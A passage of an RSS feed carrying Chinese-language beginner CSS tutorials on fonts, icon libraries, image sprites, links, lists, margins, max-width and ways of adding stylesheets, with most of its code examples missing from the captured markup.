<li><strong>幻想字体（Fantasy）</strong>：是装饰性俏皮的字体</li>
</ul>
<p>所有不同的字体名称都属于这五个通用字体系列之一。</p>
<div class="hint-container note">
<p class="hint-container-title">注</p>
<p>在计算机屏幕上，无衬线字体被认为比衬线字体 <strong>更易于阅读</strong></p>
</div>
<h3> 一些字体的例子</h3>
<table>
<thead>
<tr>
<th style="text-align:center">通用字体族</th>
<th style="text-align:left">字体名称实例</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><p style="font-family: Serif">衬线字体（Serif）</p></td>
<td style="text-align:left"><p style="font-family: 'Times New Roman'">Times New Roman</p><p style="font-family: Georgia">Georgia</p><p style="font-family: Garamond">Garamond</p></td>
</tr>
<tr>
<td style="text-align:center"><p style="font-family: Sans-serif">无衬线字体（Sans-serif）</p></td>
<td style="text-align:left"><p style="font-family: Arial">Arial</p><p style="font-family: Verdana">Verdana</p><p style="font-family: Helvetica">Helvetica</p></td>
</tr>
<tr>
<td style="text-align:center"><p style="font-family: Monospace">等宽字体（Monospace）</p></td>
<td style="text-align:left"><p style="font-family: 'Courier New'">Courier New</p><p style="font-family: 'Lucida Console'">Lucida Console</p><p style="font-family: Monaco">Monaco</p></td>
</tr>
<tr>
<td style="text-align:center"><p style="font-family: Cursive">草书字体（Cursive）</p></td>
<td style="text-align:left"><p style="font-family: 'Brush Script MT'">Brush Script MT</p><p style="font-family: 'Lucida Handwriting'">Lucida Handwriting</p></td>
</tr>
<tr>
<td style="text-align:center"><p style="font-family: Fantasy">幻想字体（Fantasy）</p></td>
<td style="text-align:left"><p style="font-family: Copperplate">Copperplate</p><p style="font-family: Papyrus">Papyrus</p></td>
</tr>
</tbody>
</table>
<h3> font-family 属性</h3>
<p>在 CSS 中，使用 <code>font-family</code> 属性规定文本的字体。</p>
<p><code>font-family</code> 属性应包含多个字体名称作为 “后备” 系统，以确保浏览器和操作系统之间的最大兼容性。请以您需要的字体开始，并以通用系列结束（如果没有其他可用字体，则让浏览器选择通用系列中的相似字体）。字体名称应以逗号分隔。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>如果字体名称不止一个单词，则必须用引号引起来。例如：<code>"Times New Roman"</code></p>
</div>
<p>例如：</p>

<h2> 字体样式</h2>
<p><code>font-style</code> 属性主要用于指定斜体文本。</p>
<p>此属性可设置三个值：</p>
<ul>
<li><strong>normal</strong>：文字正常显示</li>
<li><strong>italic</strong>：文本以斜体显示</li>
<li><strong>oblique</strong>：文本为 “倾斜”（倾斜与斜体非常相似，但支持较少）</li>
</ul>
<p>例如：</p>

<h3> 字体粗细</h3>
<p><code>font-weight</code> 属性指定字体的粗细。例如：</p>

<ul>
<li><strong>normal</strong>：定义标准的字符。默认值</li>
<li><strong>lighter</strong>：定义更细的字符</li>
<li><strong>bold</strong>：定义粗的字符</li>
<li><strong>100-900</strong>：定义由粗到细的字符。<code>400</code> 等同于 <code>normal</code>，而 <code>700</code> 等同于 <code>bold</code></li>
</ul>
<h3> 字体变体</h3>
<p><code>font-variant</code> 属性指定是否以 <code>small-caps</code> 字体（小型大写字母）显示文本。</p>
<p>在 <code>small-caps</code> 字体中，所有小写字母都将转换为大写字母。但是，转换后的大写字母的字体大小 <strong>小于</strong> 文本中原始大写字母的字体大小。例如：</p>

<h2> 字体大小</h2>
<p><code>font-size</code> 属性设置文本的大小。</p>
<p>在网页设计中，能够管理文本大小很重要。但是，不应使用调整字体大小来使段落看起来像标题，或是使标题看起来像段落。</p>
<p>请始终使用正确的 HTML 标签。例如：<code>&lt;h1&gt;</code> - <code>&lt;h6&gt;</code> 用于标题，而 <code>&lt;p&gt;</code> 仅用于段落。</p>
<p><code>font-size</code> 值可以是绝对或相对尺寸大小。</p>
<p>绝对尺寸：</p>
<ul>
<li>将文本设置为指定大小</li>
<li>不允许用户在所有浏览器中更改文本大小（可访问性不佳）</li>
<li>当输出的物理尺寸已知时，绝对尺寸很有用</li>
</ul>
<p>相对尺寸：</p>
<ul>
<li>设置相对于周围元素的大小</li>
<li>允许用户在浏览器中更改文本大小</li>
</ul>
<div class="hint-container note">
<p class="hint-container-title">注</p>
<p>如果您没有指定字体大小，则普通文本（如段落）的默认大小为 <code>16px</code>（<code>16px = 1em</code>）</p>
</div>
<h3> 以像素设置字体大小</h3>
<p>使用像素设置文本大小可以完全控制文本大小。例如：</p>

<h3> 用 em 设置字体大小</h3>
<p>为了允许用户调整文本大小（在浏览器菜单中），许多开发人员使用 <code>em</code> 而不是像素。</p>
<p>W3C 建议使用 <code>em</code> 尺寸单位。</p>
<p><code>1em</code> 等于当前字体大小。浏览器中的默认文本大小为 <code>16px</code>。因此，默认大小 <code>1em</code> 为 <code>16px</code>。</p>
<p>可以使用这个公式从像素到 <code>em</code> 来计算大小：<code>pixels/16=em</code>。例如：</p>

<h3> 使用百分比和 Em 的组合</h3>
<p>例如：</p>

<h3> 响应式字体大小</h3>
<p>可以使用 <code>vw</code> 单位设置文本大小，它的意思是 “视口宽度”（"viewport width"）。</p>
<p>视口（Viewport）是浏览器窗口的大小。<code>1vw</code> = 视口宽度的 <code>1％</code>。如果视口为 <code>50</code> 厘米宽，则 <code>1vw</code> 为 <code>0.5</code> 厘米。</p>
<p>这样，文本大小将遵循浏览器窗口的大小，请调整浏览器窗口的大小，以查看字体大小如何缩放。例如：</p>

<h2> 谷歌字体</h2>
<p>如果您不想使用 HTML 中的任何标准字体，则可以使用 Google Fonts API 向页面添加数百种其他字体。</p>
<p>只需添加一个样式表链接并引用您选择的字体系列。例如：</p>

<h2> 简写字体属性</h2>
<p>为了缩短代码，也可以在一个属性中指定所有单个字体属性。</p>
<p><code>font</code> 属性是以下属性的简写属性：</p>
<ul>
<li><strong>font-style</strong>：定义字体的风格</li>
<li><strong>font-variant</strong>：定义小型大写字母文本</li>
<li><strong>font-weight</strong>：定义文本的粗细</li>
<li><strong>font-size/line-height</strong>：定义字体的尺寸，设置行间的距离（行高）</li>
<li><strong>font-family</strong>：定义文本的字体</li>
</ul>
<p>例如：</p>

<div class="hint-container warning">
<p class="hint-container-title">注意</p>
<p><code>font-size</code> 和 <code>font-family</code> 的值是必需的。如果缺少其他值之一，则会使用其默认值</p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>图标</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/icons.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/icons.html</guid>
      <source url="https://sankgao.github.io/rss.xml">图标</source>
      <description>如何添加图标 向 HTML 页面添加图标的最简单方法是使用图标库。比如：Font Awesome。 将指定的图标类的名称添加到任何行内 HTML 元素（如： 或 ）。 下面的图标库中的所有图标都是可缩放矢量，可以使用 CSS 进行自定义（大小、颜色、阴影等）。 Font Awesome 图标 如需使用 Font Awesome 图标，请访问 fonta...</description>
      <category>Frontend</category>
      <pubDate>Tue, 16 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 如何添加图标</h2>
<p>向 HTML 页面添加图标的最简单方法是使用图标库。比如：Font Awesome。</p>
<p>将指定的图标类的名称添加到任何行内 HTML 元素（如：<code>&lt;i&gt;</code> 或 <code>&lt;span&gt;</code>）。</p>
<p>下面的图标库中的所有图标都是可缩放矢量，可以使用 CSS 进行自定义（大小、颜色、阴影等）。</p>
<h2> Font Awesome 图标</h2>
<p>如需使用 Font Awesome 图标，请访问 <a href="https://fontawesome.com/" target="_blank" rel="noopener noreferrer">fontawesome</a>，登录并获取代码添加到 HTML 页面的 <code>&lt;head&gt;</code> 部分：</p>
<div class="language-html line-numbers-mode" data-ext="html"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>例如：</p>

<h2> Bootstrap 图标</h2>
<p>如需使用 <a href="https://v5.bootcss.com/" target="_blank" rel="noopener noreferrer">Bootstrap 图标</a>，请在 HTML 页面的 <code>&lt;head&gt;</code> 部分内添加这行引用 MAX CDN 链接：</p>
<div class="language-html line-numbers-mode" data-ext="html"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>例如：</p>

<h2> Google 图标</h2>
<p>如需使用 <a href="https://www.mdui.org/docs/material_icon" target="_blank" rel="noopener noreferrer">Google 图标</a>，请在 HTML 页面的 <code>&lt;head&gt;</code> 部分中添加以下行引用 Google CDN 链接：</p>
<div class="language-html line-numbers-mode" data-ext="html"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>例如：</p>

]]></content:encoded>
    </item>
    <item>
      <title>图片库</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/images.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/images.html</guid>
      <source url="https://sankgao.github.io/rss.xml">图片库</source>
      <description>图片库 CSS 可用于创建图片库。例如： 演示 图像精灵 图像精灵是单个图像中包含的图像集合。 包含许多图像的网页可能需要很长时间才能加载，同时会生成多个服务器请求。 使用图像精灵将减少服务器请求的数量并节约带宽。 使用以下单幅图像（navsprites.gif）而不是使用三幅单独的图像： 例如：CSS 指定了显示 navsprites.gif 图像的...</description>
      <category>Frontend</category>
      <pubDate>Fri, 19 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 图片库</h2>
<p>CSS 可用于创建图片库。例如：</p>

<h2> 图像精灵</h2>
<p>图像精灵是单个图像中包含的图像集合。</p>
<p>包含许多图像的网页可能需要很长时间才能加载，同时会生成多个服务器请求。</p>
<p>使用图像精灵将减少服务器请求的数量并节约带宽。</p>
<p>使用以下单幅图像（<code>navsprites.gif</code>）而不是使用三幅单独的图像：</p>
<img src="/html5/navsprites.gif" alt="navsprites">
<p>例如：CSS 指定了显示 <code>navsprites.gif</code> 图像的哪部分。</p>

<ul>
<li><strong>&lt;img id="home" src="trans.gif" /&gt;</strong>：仅定义小的透明图像，因为 <code>src</code> 属性不能为空。而实际显示的图像将是在 CSS 中指定的背景图像</li>
<li><strong>width: 46px; height: 44px;</strong>：定义我们要使用的图像部分</li>
<li><strong>background: url(navsprites.gif) 0 0;</strong>：定义背景图片及其位置（<code>left 0px</code>, <code>top 0px</code>）</li>
</ul>
<h3> 创建导航列表</h3>
<p>使用精灵图片（<code>navsprites.gif</code>）来创建一个导航列表。</p>
<p>使用 HTML 列表，因为它可以是链接，同时还支持背景图片。例如：CSS 指定了显示 <code>navsprites.gif</code> 图像的哪部分。</p>

<h3> 悬停效果</h3>
<p>向导航列表中添加悬停效果。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p><code>:hover</code> 选择器可用于所有元素，而不仅限于链接</p>
</div>
<p>使用新图像（<code>navsprites_hover.gif</code>）包含三幅导航图像和三幅用于悬停效果的图像：</p>
<img src="/html5/navsprites_hover.gif" alt="navsprites_hover">
<p>因为这是一幅图像，而不是六个单独的文件，所以当用户将鼠标悬停在图像上时，不会有加载延迟。</p>
<p>仅添加三行代码来实现悬停效果。例如：</p>

]]></content:encoded>
    </item>
    <item>
      <title>inline_block</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/inline_block.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/inline_block.html</guid>
      <source url="https://sankgao.github.io/rss.xml">inline_block</source>
      <description>与 display: inline 相比，主要区别在于 display: inline-block 允许在元素上设置宽度和高度。 同样，如果设置了 display: inline-block，将保留上下外边距或内边距，而 display: inline 则不会。 与 display: block 相比，主要区别在于 display：inline-blo...</description>
      <category>Frontend</category>
      <pubDate>Thu, 18 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>与 <code>display: inline</code> 相比，主要区别在于 <code>display: inline-block</code> 允许在元素上设置宽度和高度。</p>
<p>同样，如果设置了 <code>display: inline-block</code>，将保留上下外边距或内边距，而 <code>display: inline</code> 则不会。</p>
<p>与 <code>display: block</code> 相比，主要区别在于 <code>display：inline-block</code> 在元素之后不添加换行符，因此该元素可以位于其他元素旁边。</p>
<p>例如：下例展示 <code>display: inline</code>、<code>display: inline-block</code> 以及 <code>display: block</code> 的不同行为。</p>

]]></content:encoded>
    </item>
    <item>
      <title>简介</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/introduction.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/introduction.html</guid>
      <source url="https://sankgao.github.io/rss.xml">简介</source>
      <description>CSS 是一种描述 HTML 文档 样式 的语言。 CSS 描述应该如何显示 HTML 元素。 什么是 CSS CSS 指的是 层叠样式表（Cascading Style Sheets）是一种 样式表 语言; CSS 描述了如何在屏幕、纸张或其他媒体上的元素应该如何 被渲染 的问题; CSS 节省了大量工作。它可以同时控制多张网页的布局; 外部样式表存...</description>
      <category>Frontend</category>
      <pubDate>Mon, 15 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>CSS 是一种描述 HTML 文档 <strong>样式</strong> 的语言。</p>
<p>CSS 描述应该如何显示 HTML 元素。</p>
<h2> 什么是 CSS</h2>
<ul>
<li>CSS 指的是 <strong>层叠样式表</strong>（Cascading Style Sheets）是一种 <strong>样式表</strong> 语言</li>
<li>CSS 描述了如何在屏幕、纸张或其他媒体上的元素应该如何 <strong>被渲染</strong> 的问题</li>
<li>CSS 节省了大量工作。它可以同时控制多张网页的布局</li>
<li>外部样式表存储在 <strong>CSS 文件</strong> 中</li>
<li>层叠样式表也称 <strong>级联样式表</strong></li>
</ul>
<h2> CSS 解决了一个大问题</h2>
<p>HTML 从未打算包含用于格式化网页的标签。</p>
<p>创建 HTML 的目的是描述网页的内容。例如：</p>
<div class="language-html line-numbers-mode" data-ext="html"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>将 <code>&lt;font&gt;</code> 之类的标签和 <code>color</code> 属性添加到 HTML3.2 规范后，Web 开发人员的噩梦开始了。大型网站的开发将字体和颜色信息添加到每个页面中，这演变为一个漫长而昂贵的过程。</p>
<p>CSS 从 HTML 页面中删除了样式格式。</p>
<h2> CSS 节省了大量工作</h2>
<p>样式定义通常保存在外部 <code>.css</code> 文件中。</p>
<p>通过使用外部样式表文件，您只需更改一个文件即可更改整个网站的外观。</p>
<h2> 实例</h2>

]]></content:encoded>
    </item>
    <item>
      <title>链接</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/link.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/link.html</guid>
      <source url="https://sankgao.github.io/rss.xml">链接</source>
      <description>通过 CSS，可以用不同的方式设置链接的样式。 设置链接样式 链接可以使用任何 CSS 属性（例如：color、`font-family、background 等）来设置样式。例如： 演示 此外，可以根据链接处于什么状态来设置链接的不同样式。 四种链接状态分别是： a:link：正常的，未访问的链接; a:visited：用户访问过的链接; a:hov...</description>
      <category>Frontend</category>
      <pubDate>Wed, 17 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>通过 CSS，可以用不同的方式设置链接的样式。</p>
<h2> 设置链接样式</h2>
<p>链接可以使用任何 CSS 属性（例如：<code>color</code>、<code>font-family</code>、<code>background</code> 等）来设置样式。例如：</p>

<p>此外，可以根据链接处于什么状态来设置链接的不同样式。</p>
<p><strong>四种链接状态分别是：</strong></p>
<ul>
<li><strong>a:link</strong>：正常的，未访问的链接</li>
<li><strong>a:visited</strong>：用户访问过的链接</li>
<li><strong>a:hover</strong>：用户将鼠标悬停在链接上时</li>
<li><strong>a:active</strong>：链接被点击时</li>
</ul>
<p>例如：</p>

<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>如果为多个链接状态设置样式，请遵循如下顺序规则：</p>
<ul>
<li><code>a:hover</code> 必须位于 <code>a:link</code> 和 <code>a:visited</code> 之后才能生效</li>
<li><code>a:active</code> 必须位于 <code>a:hover</code> 之后才能生效</li>
</ul>
</div>
<h2> 文本装饰</h2>
<p><code>text-decoration</code> 属性主要用于从链接中删除下划线。例如：</p>

<h2> 背景色</h2>
<p><code>background-color</code> 属性可用于指定链接的背景色。例如：</p>

<h2> 链接按钮</h2>
<p>组合了多个 CSS 属性，将链接显示为框/按钮。例如：</p>

<ul>
<li><strong>background-color</strong>：属性设置背景颜色</li>
<li><strong>color</strong>：属性设置字体颜色</li>
<li><strong>padding</strong>：属性设置内边框边距。<code>14px 25px</code> 上下内边框边距为 14px；左右内边框边距为 25px</li>
<li><strong>text-align</strong>：属性用于设置文本的水平对齐方式。<code>center</code> 文本居中</li>
<li><strong>text-decoration</strong>：属性用于设置或删除文本装饰。<code>none</code> 用于从链接上删除下划线</li>
<li><strong>display</strong>：属性规定元素应该生成的框的类型。<code>inline-block</code> 行内块元素</li>
</ul>
<h2> 链接实例</h2>
<ul>
<li>
<p>为超链接添加不同的样式。例如：</p>

</li>
<li>
<p>创建带边框的链接按钮。例如：</p>

</li>
<li>
<p>改变光标</p>
<p><code>cursor</code> 属性指定要显示的光标类型。例如：</p>

</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>列表</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/list.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/list.html</guid>
      <source url="https://sankgao.github.io/rss.xml">列表</source>
      <description>HTML 列表和 CSS 列表属性 在 HTML 中，列表主要有两种类型： 无序列表（）- 列表项用的是项目符号标记; 有序列表（）- 列表项用的是数字或字母标记; CSS 列表属性使您可以： 为有序列表设置不同的列表项标记; 为无序列表设置不同的列表项标记; 将图像设置为列表项标记; 为列表和列表项添加背景色; 不同的列表项目标记 list-styl...</description>
      <category>Frontend</category>
      <pubDate>Wed, 17 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> HTML 列表和 CSS 列表属性</h2>
<p>在 HTML 中，列表主要有两种类型：</p>
<ul>
<li>无序列表（<code>&lt;ul&gt;</code>）- 列表项用的是项目符号标记</li>
<li>有序列表（<code>&lt;ol&gt;</code>）- 列表项用的是数字或字母标记</li>
</ul>
<p>CSS 列表属性使您可以：</p>
<ul>
<li>为有序列表设置不同的列表项标记</li>
<li>为无序列表设置不同的列表项标记</li>
<li>将图像设置为列表项标记</li>
<li>为列表和列表项添加背景色</li>
</ul>
<h2> 不同的列表项目标记</h2>
<p><code>list-style-type</code> 属性指定列表项标记的类型。例如：</p>

<h2> 图像作为列表项标记</h2>
<p><code>list-style-image</code> 属性将图像指定为列表项标记。例如：</p>

<h2> 定位列表项标记</h2>
<p><code>list-style-position</code> 属性指定列表项标记（项目符号）的位置。</p>
<ul>
<li><strong>outside</strong>：表示项目符号点将在列表项之外。列表项每行的开头将垂直对齐。这是默认的</li>
<li><strong>inside</strong>：表示项目符号将在列表项内。由于它是列表项的一部分，因此它将成为文本的一部分，并在开头推开文本</li>
</ul>
<p>例如：</p>

<h2> 删除默认设置</h2>
<p><code>list-style-type</code> 属性 <code>none</code> 值可以用于删除标记或项目符号。</p>
<p>列表还拥有默认的 <strong>外边距</strong> 和 <strong>内边距</strong>。要删除此内容，请在 <code>&lt;ul&gt;</code> 或 <code>&lt;ol&gt;</code> 中添加 <code>margin: 0</code> 和 <code>padding: 0</code>。例如：</p>

<h2> 简写属性</h2>
<p><code>list-style</code> 属性是一种简写属性。它用于在一条声明中设置所有列表属性。例如：</p>

<p>在使用简写属性时，属性值的顺序为：</p>
<ul>
<li><strong>list-style-type</strong>：如果指定了 <code>list-style-image</code>，那么在由于某种原因而无法显示图像时，会显示这个属性的值</li>
<li><strong>list-style-position</strong>：指定列表项标记应显示在内容流的内部还是外部</li>
<li><strong>list-style-image</strong>：将图像指定为列表项标记</li>
</ul>
<p>如果缺少上述属性值之一，则将插入缺失属性的默认值（如果有）。</p>
<h2> 设置列表的颜色样式</h2>
<p>可以使用颜色设置列表样式，使它们看起来更有趣。</p>
<p>添加到 <code>&lt;ol&gt;</code> 或 <code>&lt;ul&gt;</code> 标记的任何样式都会影响整个列表，而添加到 <code>&lt;li&gt;</code> 标记的属性将影响各个列表项。例如：</p>

]]></content:encoded>
    </item>
    <item>
      <title>外边距</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/margin.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/margin.html</guid>
      <source url="https://sankgao.github.io/rss.xml">外边距</source>
      <description>CSS margin 属性用于在任何定义的边框之外，为元素周围创建空间。例如： 演示 通过 CSS 您可以完全控制外边距。有一些属性可用于设置元素每侧（上、右、下和左）的外边距。 单独的边 CSS 拥有用于为元素的每一侧指定外边距的属性： margin-top：上外边距; margin-right：右外边距; margin-bottom：下外边距; m...</description>
      <category>Frontend</category>
      <pubDate>Mon, 15 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>CSS <code>margin</code> 属性用于在任何定义的边框之外，为元素周围创建空间。例如：</p>

<p>通过 CSS 您可以完全控制外边距。有一些属性可用于设置元素每侧（上、右、下和左）的外边距。</p>
<h2> 单独的边</h2>
<p>CSS 拥有用于为元素的每一侧指定外边距的属性：</p>
<ul>
<li><strong>margin-top</strong>：上外边距</li>
<li><strong>margin-right</strong>：右外边距</li>
<li><strong>margin-bottom</strong>：下外边距</li>
<li><strong>margin-left</strong>：左外边距</li>
</ul>
<p>所有外边距属性都可以设置以下值：</p>
<ul>
<li><strong>auto</strong>：通过浏览器来计算外边距</li>
<li><strong>length</strong>：以 <code>px</code>、<code>pt</code>、<code>cm</code> 等单位指定外边距</li>
<li><strong>%</strong>：指定以包含元素宽度的百分比计的外边距</li>
<li><strong>inherit</strong>：指定应从父元素继承外边距</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>允许负值</p>
</div>
<p>为四个边设置不同的外边距。例如：</p>

<h3> 简写属性</h3>
<p>为了缩减代码，可以在一个属性中指定所有外边距属性。</p>
<p><code>margin</code> 属性是以下各外边距属性的简写属性：</p>
<ul>
<li><code>margin-top</code></li>
<li><code>margin-right</code></li>
<li><code>margin-bottom</code></li>
<li><code>margin-left</code></li>
</ul>
<ol>
<li>
<p><code>margin</code> 属性设置四个值。例如：</p>

</li>
<li>
<p><code>margin</code> 属性设置三个值。例如：</p>

</li>
<li>
<p><code>margin</code> 属性设置两个值。例如：</p>

</li>
<li>
<p><code>margin</code> 属性设置一个值。例如：</p>

</li>
</ol>
<h3> auto 值</h3>
<p>将 <code>margin</code> 属性设置为 <code>auto</code>，以使元素在其容器中水平居中。</p>
<p>然后，该元素将占据指定的宽度，并且剩余空间将在左右边界之间平均分配。例如：</p>

<h3> inherit 值</h3>
<p>使 <code>&lt;p class="ex1"&gt;</code> 元素的左外边距继承自父元素（<code>&lt;div&gt;</code>）。例如：</p>

<h2> CSS 外边距合并</h2>
<p>外边距合并指的是：当两个垂直外边距相遇时，它们将形成一个外边距。</p>
<p>合并后的外边距的高度等于两个发生合并的外边距的高度中的 <strong>较大者。</strong></p>
<h3> 外边距合并</h3>
<p>外边距合并（叠加）是一个相当简单的概念。但是，在实践中对网页进行布局时，它会造成许多混淆。</p>
<p>简单地说，外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。</p>
<h3> 外边距合并形成一个外边距</h3>
<p>当一个元素出现在另一个元素上面时，第一个元素的下外边距与第二个元素的上外边距会发生合并。如下所示：</p>
<p><code>text</code> 为内容区域</p>
<div class="language-text line-numbers-mode" data-ext="text"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>例如：</p>

<h3> </h3>
<p>当一个元素包含在另一个元素中时（假设没有内边距或边框把外边距分隔开），它们的上和下外边距也会发生合并。如下所示：</p>
<div class="language-text line-numbers-mode" data-ext="text"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>例如：</p>

<p>尽管看上去有些奇怪，但是外边距甚至可以与自身发生合并。</p>
<p>假设有一个空元素，它有外边距，但是没有边框或填充。在这种情况下，上外边距与下外边距就碰到了一起，它们会发生合并。如下所示：</p>
<div class="language-text line-numbers-mode" data-ext="text"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果这个外边距遇到另一个元素的外边距，它还会发生合并。如下所示：</p>
<div class="language-text line-numbers-mode" data-ext="text"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这就是一系列的段落元素 <strong>占用空间非常小</strong> 的原因，因为它们的所有外边距都 <strong>合并到一起</strong>，形成了一个 <strong>小的外边距。</strong></p>
<p>外边距合并初看上去可能有点奇怪，但是实际上，它是有意义的。以由几个段落组成的典型文本页面为例。第一个段落上面的空间等于段落的上外边距。如果没有外边距合并，后续所有段落之间的外边距都将是相邻上外边距和下外边距的和。这意味着段落之间的空间是页面顶部的两倍。如果发生外边距合并，段落之间的上外边距和下外边距就合并在一起，这样各处的距离就一致了。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>只有普通文档流中块框的 <strong>垂直外边距</strong> 才会发生外边距合并。行内框、浮动框或绝对定位之间的外边距不会合并</p>
</div>
<h3> 外边距属性</h3>
<ul>
<li><strong>margin</strong>：用于在一条声明中设置外边距属性的简写属性</li>
<li><strong>margin-top</strong>：设置元素的上外边距</li>
<li><strong>margin-right</strong>：设置元素的右外边距</li>
<li><strong>margin-bottom</strong>：设置元素的下外边距</li>
<li><strong>margin-left</strong>：设置元素的左外边距</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>max-width</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/max_width.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/max_width.html</guid>
      <source url="https://sankgao.github.io/rss.xml">max-width</source>
      <description>使用 width、max-width 和 margin: auto; 块级元素始终占用可用的全部宽度（尽可能向左和向右伸展）。 设置块级元素的 width 将防止其延伸到其容器的边缘。然后，您可以将外边距设置为 auto，以将元素在其容器中水平居中。元素将占用指定的宽度，剩余空间将在两个外边距之间平均分配。例如： 演示 当浏览器窗口小于元素的宽度时，上...</description>
      <category>Frontend</category>
      <pubDate>Wed, 17 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 使用 width、max-width 和 margin: auto;</h2>
<p>块级元素始终占用可用的全部宽度（尽可能向左和向右伸展）。</p>
<p>设置块级元素的 <code>width</code> 将防止其延伸到其容器的边缘。然后，您可以将外边距设置为 <code>auto</code>，以将元素在其容器中水平居中。元素将占用指定的宽度，剩余空间将在两个外边距之间平均分配。例如：</p>

<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>当浏览器窗口小于元素的宽度时，上面这个 <code>&lt;div&gt;</code> 会发生问题。浏览器会将水平滚动条添加到页面</p>
</div>
<p>在这种情况下，使用 <code>max-width</code> 可以改善浏览器对小窗口的处理。为了使网站在小型设备上可用，这一点很重要。例如：</p>

<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>将浏览器窗口的大小调整为小于 500 像素，以查看两个 div 之间的区别</p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>添加 CSS 方法</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/methods.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/methods.html</guid>
      <source url="https://sankgao.github.io/rss.xml">添加 CSS 方法</source>
      <description>当浏览器读到样式表时，它将根据样式表中的信息来格式化 HTML 文档。 有三种插入 CSS 样式表的方法： 外部 CSS; 内部 CSS; 行内 CSS; 外部 CSS 通过使用外部样式表，您只需修改一个文件即可改变整个网站的外观。 每张 HTML 页面必须在 head 部分的 元素内 包含 对外部样式表文件的引用。 外部样式 在 HTML 页面 部分...</description>
      <category>Frontend</category>
      <pubDate>Mon, 15 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>当浏览器读到样式表时，它将根据样式表中的信息来格式化 HTML 文档。</p>
<p>有三种插入 CSS 样式表的方法：</p>
<ul>
<li><strong>外部 CSS</strong></li>
<li><strong>内部 CSS</strong></li>
<li><strong>行内 CSS</strong></li>
</ul>
<h2> 外部 CSS</h2>
<p>通过使用外部样式表，您只需修改一个文件即可改变整个网站的外观。</p>
<p>每张 HTML 页面必须在 <code>head</code> 部分的 <code>&lt;link&gt;</code> 元素内 <strong>包含</strong> 对外部样式表文件的引用。</p>
<p><strong>外部样式</strong> 在 HTML 页面 <code>&lt;head&gt;</code> 部分内的 <code>&lt;link&gt;</code> 元素中进行定义。例如：</p>

<ul>
<li><strong>&lt;link&gt;</strong>：标签定义文档与外部资源的关系</li>
<li><strong>rel</strong>：规定当前文档与被链接文档之间的关系</li>
<li><strong>href</strong>：规定被链接文档的位置</li>
</ul>
<p><code>mystyle.css</code> 文件是这样的：</p>
<div class="language-css line-numbers-mode" data-ext="css"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="hint-container tip">
<p class="hint-container-title">提示</p>
